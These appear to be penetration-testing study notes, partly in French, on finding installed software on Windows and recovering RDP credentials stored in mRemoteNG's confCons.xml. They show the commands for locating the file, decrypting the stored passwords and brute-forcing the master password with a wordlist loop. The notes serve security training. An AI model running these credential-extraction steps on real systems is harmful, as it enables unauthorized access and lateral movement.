# Installed Applications / mRemoteNG

### <mark style="color:red;">Installed Applications</mark>

<mark style="color:green;">**Identifying Common Applications**</mark>

```cmd-session
dir "C:\Program Files"
```

<mark style="color:green;">**Get Installed Programs via PowerShell & Registry Keys**</mark>

<pre class="language-powershell" data-full-width="true"><code class="lang-powershell"><strong>$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
</strong>$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
</code></pre>

{% hint style="info" %}
We can see the `mRemoteNG` software is installed on the system. [mRemoteNG](https://mremoteng.org) is a tool used to manage and connect to remote systems using VNC, RDP, SSH, and similar protocols. Let's take a look at `mRemoteNG`.
{% endhint %}

<mark style="color:green;">**mRemoteNG**</mark>

By default, the configuration file is located in `%USERPROFILE%\APPDATA\Roaming\mRemoteNG`.

<mark style="color:green;">**Discover mRemoteNG Configuration Files**</mark>

```powershell-session
ls C:\Users\julio\AppData\Roaming\mRemoteNG
```

Let's look at the contents of the `confCons.xml` file.

<mark style="color:green;">**mRemoteNG Configuration File - confCons.xml**</mark>

{% code fullWidth="true" %}
```xml
<?XML version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="QcMB21irFadMtSQvX5ONMEh7X+TSqRX3uXO5DKShwpWEgzQ2YBWgD/uQ86zbtNC65Kbu3LKEdedcgDNO6N41Srqe" ConfVersion="2.6">
    <Node Name="RDP_Domain" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="096332c1-f405-4e1e-90e0-fd2a170beeb5" Username="administrator" Domain="test.local" Password="sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" Hostname="10.0.0.10" Protocol="RDP" PuttySession="Default Settings" Port="3389"
    ..SNIP..
</Connections>
```
{% endcode %}

**1️⃣ Ce que fait mRemoteNG**

* C’est un programme qui stocke des connexions (RDP, SSH, etc.).
* Les identifiants sont dans un fichier XML (`confCons.xml`).
* Le **mot de passe du compte distant** est chiffré.
* Pour le chiffrer, mRemoteNG utilise **un mot de passe maître** (master password).
  * **Si l’utilisateur n’en met pas** → mot de passe maître par défaut connu.
  * **S’il en met un** → il faut le connaître pour déchiffrer.

***

**2️⃣ Les deux données importantes**

Dans le fichier XML, tu as :

* **`Protected`** → c’est le mot de passe maître (lui-même chiffré).
* **`Password`** → c’est le mot de passe du compte distant (chiffré avec le mot de passe maître).

<mark style="color:green;">**Decrypt the Password with mremoteng\_decrypt**</mark>

{% code fullWidth="true" %}
```shell-session
python3 mremoteng_decrypt.py -s "sPp6b6T...8NEBMcQ6UnuOdkerig==" 
```
{% endcode %}

Now let's look at an encrypted configuration file with a custom password. For this example, we set the custom password `admin`.

<mark style="color:green;">**mRemoteNG Configuration File - confCons.xml**</mark>

{% code fullWidth="true" %}
```xml
<?XML version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="1ZR9DpX3eXumopcnjhTQ7e78u+SXqyxDmv2jebJg09pg55kBFW+wK1e5bvsRshxuZ7yvteMgmfMW5eUzU4NG" ConfVersion="2.6">
    <Node Name="RDP_Domain" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="096332c1-f405-4e1e-90e0-fd2a170beeb5" Username="administrator" Domain="test.local" Password="EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" Hostname="10.0.0.10" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="False" 
    
<SNIP>
</Connections>
```
{% endcode %}

If we attempt to decrypt the `Password` attribute from the node `RDP_Domain`, we will get the following error.

<mark style="color:green;">**Attempt to Decrypt the Password with a Custom Password**</mark>

{% code fullWidth="true" %}
```shell-session
python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA=="
```
{% endcode %}

If we use the custom password, we can decrypt it.

<mark style="color:green;">**Decrypt the Password with mremoteng\_decrypt and a Custom Password**</mark>

{% code fullWidth="true" %}
```shell-session
python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p admin
```
{% endcode %}

<mark style="color:green;">**For Loop to Crack the Master Password with mremoteng\_decrypt**</mark>

{% code fullWidth="true" %}
```shell-session
for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $password 2>/dev/null;done    
```
{% endcode %}
